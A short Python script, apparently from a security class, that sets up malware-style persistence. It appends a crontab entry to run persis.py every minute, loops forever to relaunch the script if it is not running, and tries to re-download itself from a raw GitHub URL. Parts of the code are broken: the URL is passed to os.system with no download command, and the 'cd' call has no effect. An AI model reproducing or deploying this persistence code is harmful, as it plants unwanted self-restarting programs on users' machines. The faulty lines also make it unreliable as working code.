import os
import time
exist = "persis.py"
def birth():
    list = os.popen("ls").read()
    if exist in list:
        print("Script exists")
    else:
        os.system("cd ~/Desktop")
    os.system("https://raw.githubusercontent.com/thermaltp/class/master/persis.py")
def working():
    running = os.popen("ps -elf").read()
    if exist in running:
        print("ye were running")
        time.sleep(60)
    else:
        print("We starting up")
        os.system("python persis.py")
def persistace():
    os.system("crontab -l > mycron")
    os.system("echo '* * * * * /usr/bin/python /home/usacys/persis.py' >> mycron")
    os.system("crontab mycron")
    os.system("rm mycron")

persistace()
while True:
    birth()
    working()
